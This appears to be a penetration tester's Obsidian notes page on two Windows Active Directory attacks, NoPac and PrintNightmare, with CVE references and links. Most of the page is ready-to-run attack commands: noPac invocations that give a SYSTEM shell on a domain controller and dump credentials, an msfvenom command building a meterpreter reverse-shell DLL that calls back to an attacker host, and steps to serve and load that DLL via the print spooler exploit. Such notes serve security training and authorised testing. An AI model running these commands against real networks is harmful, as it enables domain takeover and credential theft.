```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## NoPac (SamAccountName Spoofing)
**CVEs**: 
- [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) : Bypass vulnerability with the Security Account Manager (SAM)
- [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) : Vulnerability with the Kerberos Privilege Attribute Certificate (PAC) in ADDS
**Writeup**: 
- [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)
- [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
**Tool**: [noPac](https://github.com/Ridter/noPac) (includes a `scanner.py` and exploit `noPac.py`)

The idea is that you can change a computer account's SamAccountName to that of a DC. We can then request Kerberos tickets causing that service to issue tickets under the DC's name. This can give us SYSTEM shell access on the DC.

It relies on the `ms-DS-MachineAccountQuota` to not be `0` (*setting this to `0` can prevent a number of AD attacks*) as the user wouldn't be able to add new machine accounts.

```bash
sudo python3 scanner.py [domain]/[user]:[pass] -dc-ip [dc-ip] -use-ldap

sudo python3 noPac.py [domain]/[user]:[pass] -dc-ip [dc-ip] -dc-host [dc-name] -shell --impersonate administrator -use-ldap
```
> this can be very noisy and could be flagged by AV / EDR

This attack will leave the TGT on the attack host in the directory it was run. This `ccache` file could then be used for a [[Password Attacks#Pass-the-Hash|PtH]] or [[Abusing ACLs#DCSync|DCSync]] attack.
> We can use the `-dump` flag with noPac to a DCSync attack using [[Abusing ACLs#Using secretsdump.py|secretsdump.py]].

This tool makes use of `smbexec.py` (*from Impacket*) which can be quite noisy and easily detected by Windows Defender (*and other AVs*).

## PrintNightmare
**CVEs**:
- [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) : Print spooler improperly performs privileged file operations, allowing RCE
- [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) : Not publicly disclosed - Allows RCE
**Tool**: [cube0x0's](https://twitter.com/cube0x0?lang=en)

There are a number of exploits out there that use the RCE vulnerabilities, [cube0x0's](https://twitter.com/cube0x0?lang=en) is a popular one.
> Annoyingly, [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit uses a modified version of Impacket. `github.com/cube0x0/impacket`.

```Bash
rpcdump.py @[dc-ip] | egrep 'MS-RPRN|MS-PAR'
```
Lets us determine if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

### Create a DLL payload with [[MSFVenom]]
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATK_host] LPORT=[ATK_port] -f dll > [filename].dll
```
> Make sure to start an MSF multi/handler
### Host the DLL in an SMB Server
```bash
sudo smbserver.py -smb2support [share_name] [path_to_dll]
```
### Exploit
```bash
sudo python3 CVE-2021-1675.py [domain]/[user]:[pass] '\\[ATK_host]\[share_name]\[filename].dll'
```